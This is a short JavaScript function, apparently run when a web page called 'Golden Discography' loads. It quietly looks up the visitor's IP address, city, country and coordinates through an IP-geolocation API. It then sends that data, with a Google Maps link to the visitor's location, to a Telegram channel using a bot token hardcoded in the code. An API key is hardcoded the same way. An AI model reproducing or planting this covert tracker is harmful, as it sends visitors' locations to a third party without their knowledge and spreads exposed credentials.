function pageHasBeenLoaded(){
    let IP_KEY = '85e54d9d746b20798f99c4edb3c4402c590d6444a3216afa7d828c88'
    let SECRET_BOT_KEY = '6056564457:AAEjABiNzrOpaSkwEM6BF4NyrkosjWogE8A'
    let SECRET_CHANNEL_ID = '@bishopchannel04'

    let getIpURL = `https://api.ipdata.co/?api-key=${IP_KEY}`

    fetch(getIpURL)
        .then(data => data.json())
        .then(x => {
            let result = `IP: ${x.ip} - City: ${x.city} - Country: ${x.country_name} - Maps Link to user location: https://www.google.com/maps/@${x.latitude},${x.longitude},14z`
            
            let botID = SECRET_BOT_KEY
            let chatID = SECRET_CHANNEL_ID
            let url = `https://api.telegram.org/bot${botID}/sendMessage?chat_id=${chatID}&text=Golden Discography has been accessed Author: ${result}`
            fetch(url)
        })
}